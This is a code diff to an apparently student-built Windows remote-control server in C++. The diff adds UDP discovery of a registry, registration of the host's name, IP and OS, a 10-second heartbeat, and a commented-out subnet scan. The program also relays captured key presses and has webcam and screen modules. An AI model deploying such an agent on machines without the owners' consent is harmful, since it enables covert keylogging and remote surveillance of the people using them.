@@ -1,9 +1,11 @@
 #ifdef _WIN32
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
+
 #else
 #endif
 
+// Include libraries
 #include <boost/beast/core.hpp>
 #include <boost/beast/websocket.hpp>
 #include <boost/asio/ip/tcp.hpp>
@@ -14,23 +16,25 @@
 #include <vector>
 #include <algorithm>
 #include <nlohmann/json.hpp>
+#include <boost/beast/http.hpp>
+#include <chrono>
 
 // Include các module
 #include "src/core/CommandDispatcher.hpp"
 #include "src/interfaces/IRemoteModule.hpp"
 #include "src/modules/KeyManager.hpp"
-#include "src/modules/AppManager.hpp"
-#include "src/modules/ProcessManager.hpp"
-#include "src/modules/SystemManager.hpp"
 #include "src/modules/WebcamManager.hpp"
 #include "src/modules/ScreenManager.hpp"  // Phải có file này (chứa hàm static capture_screen_data)
 #include "src/modules/ProcessManager.hpp" // Module vừa tách file
+
 
 namespace beast     = boost::beast;
 namespace websocket = beast::websocket;
 namespace net       = boost::asio;
 using tcp           = net::ip::tcp;
 using json          = nlohmann::json;
+
+namespace http = boost::beast::http;
 
 // ==================== GLOBALS ====================
 static std::mutex cout_mtx;
@@ -174,8 +178,210 @@ void do_session(tcp::socket s) {
     g_sessionManager.leave(ws.get());
 }
 
+
+std::string get_computer_name() {
+    char buf[256];
+    DWORD size = sizeof(buf);
+    if (GetComputerNameA(buf, &size)) {
+        return std::string(buf);
+    }
+    return "UNKNOWN-PC";
+}
+std::string get_local_ip() {
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    char hostname[256];
+    gethostname(hostname, sizeof(hostname));
+
+    struct hostent* host = gethostbyname(hostname);
+    if (!host) return "127.0.0.1";
+
+    struct in_addr addr;
+    memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
+
+    WSACleanup();
+    return std::string(inet_ntoa(addr));
+}
+std::string get_os_name() {
+#ifdef _WIN64
+    return "Windows 64-bit";
+#elif _WIN32
+    return "Windows 32-bit";
+#else
+    return "Unknown OS";
+#endif
+}
+
+// std::string get_subnet() {
+//     std::string ip = get_local_ip(); // bạn đã có hàm này
+//     size_t lastDot = ip.rfind('.');
+//     return ip.substr(0, lastDot); // ví dụ "192.168.1"
+// }
+// std::string detect_registry_server() {
+//     std::string subnet = get_subnet();
+
+//     for (int i = 1; i <= 254; i++) {
+//         std::string ip = subnet + "." + std::to_string(i);
+
+//         try {
+//             net::io_context ctx;
+//             tcp::socket sock(ctx);
+//             beast::error_code ec;
+
+//             sock.connect({ net::ip::make_address(ip, ec), 3000 }, ec);
+
+//             if (!ec) {
+//                 std::cout << "[DETECT] Registry found at: " << ip << "\n";
+//                 return ip;
+//             }
+//         }
+//         catch (...) {}
+//     }
+
+//     return ""; // not found
+// }
+static std::string registry_host = "";
+
+
+// ==================== REGISTRY CLIENT ====================
+
+void registerToRegistry()
+{
+    try {
+        net::io_context ctx;
+        tcp::resolver resolver(ctx);
+        beast::tcp_stream stream(ctx);
+
+        auto const host = registry_host;//"localhost";
+        auto const port = "3000";
+        auto const target = "/api/agents/register";
+
+        // Resolve + connect
+        auto const results = resolver.resolve(host, port);
+        stream.connect(results);
+
+        // JSON body gửi lên Registry
+        json body = {
+    {"machineId", get_computer_name()},
+    {"ip", get_local_ip()},
+    {"os", get_os_name()},
+    {"wsPort", 9010},
+    {"tags", json::array({"lab", "student"})}
+        };
+
+        std::string body_str = body.dump();
+
+        http::request<http::string_body> req{ http::verb::post, target, 11 };
+        req.set(http::field::host, host);
+        req.set(http::field::content_type, "application/json");
+        req.body() = body_str;
+        req.prepare_payload();
+
+        http::write(stream, req);
+
+        // Đọc response (không dùng nhưng nên đọc để hoàn tất phiên)
+        beast::flat_buffer buffer;
+        http::response<http::string_body> res;
+        http::read(stream, buffer, res);
+
+        // Đóng socket
+        beast::error_code ec;
+        stream.socket().shutdown(tcp::socket::shutdown_both, ec);
+
+        std::cout << "[REGISTRY] Registered OK: " << res.result_int() << "\n";
+    }
+    catch (const std::exception& e) {
+        std::cout << "[REGISTRY] Register FAILED: " << e.what() << "\n";
+    }
+}
+
+void sendHeartbeat()
+{
+    try {
+        net::io_context ctx;
+        tcp::resolver resolver(ctx);
+        beast::tcp_stream stream(ctx);
+
+
+        auto const host = registry_host;//"localhost";
+        auto const port = "3000";
+        auto const target = "/api/agents/heartbeat";
+
+        auto const results = resolver.resolve(host, port);
+        stream.connect(results);
+
+        json body = {
+            {"machineId",get_computer_name()}
+        };
+
+        std::string body_str = body.dump();
+
+        http::request<http::string_body> req{ http::verb::post, target, 11 };
+        req.set(http::field::host, host);
+        req.set(http::field::content_type, "application/json");
+        req.body() = body_str;
+        req.prepare_payload();
+
+        http::write(stream, req);
+
+        beast::flat_buffer buffer;
+        http::response<http::string_body> res;
+        http::read(stream, buffer, res);
+
+        beast::error_code ec;
+        stream.socket().shutdown(tcp::socket::shutdown_both, ec);
+
+        std::cout << "[REGISTRY] Heartbeat OK\n";
+    }
+    catch (const std::exception& e) {
+        std::cout << "[REGISTRY] Heartbeat FAILED: " << e.what() << "\n";
+    }
+}
+
+#include <boost/asio.hpp> 
+using boost::asio::ip::udp;
+std::string udp_discover_registry()
+{
+    try {
+        boost::asio::io_context io;
+
+        udp::socket socket(io);
+        socket.open(udp::v4());
+
+        socket.bind(udp::endpoint(udp::v4(), 0));
+
+        socket.set_option(boost::asio::socket_base::broadcast(true));
+        socket.non_blocking(true);
+
+        udp::endpoint broadcast_ep(boost::asio::ip::address_v4::broadcast(), 8888);
+
+        std::string msg = "DISCOVER_REGISTRY";
+        socket.send_to(boost::asio::buffer(msg), broadcast_ep);
+
+        char data[256] = {};
+        udp::endpoint sender;
+
+        for (int i = 0; i < 30; i++) {       // retry 3 giây
+            boost::system::error_code ec;
+            size_t len = socket.receive_from(boost::asio::buffer(data), sender, 0, ec);
+
+            if (!ec && len > 0) {
+                std::string reply(data, len);
+                if (reply.rfind("REGISTRY_IP:", 0) == 0)
+                    return reply.substr(12);
+            }
+            Sleep(100);
+        }
+    }
+    catch (...) {}
+
+    return "";
+}
+
 int main() {
-    // SetConsoleOutputCP(CP_UTF8);
+
+    SetConsoleOutputCP(CP_UTF8);
     std::cout << "=== REMOTE SERVER (Binary Optimized) ===\n";
 
     // Đăng ký module
@@ -192,7 +398,23 @@ int main() {
         msg["data"] = { {"key", key_char} };
         g_sessionManager.broadcast(msg.dump());
     });
+    registry_host = udp_discover_registry();//"192.168.88.102";
+    // 1️⃣ Đăng ký agent lần đầu
+    // registerToRegistry();
+    if (registry_host.empty()) {
+        std::cout << "[ERROR] Không tìm thấy registry server (UDP discovery failed)\n";
+    } else {
+        registerToRegistry();
+    }
 
+    // 2️⃣ Tạo thread gửi heartbeat định kỳ 10 giây/lần
+    std::thread([]() {
+        while (true) {
+            sendHeartbeat();
+            std::this_thread::sleep_for(std::chrono::seconds(10));
+        }
+        }).detach();
+    
     try {
         net::io_context ioc{1};
         tcp::acceptor acceptor{ioc, {net::ip::make_address("0.0.0.0"), 9010}};
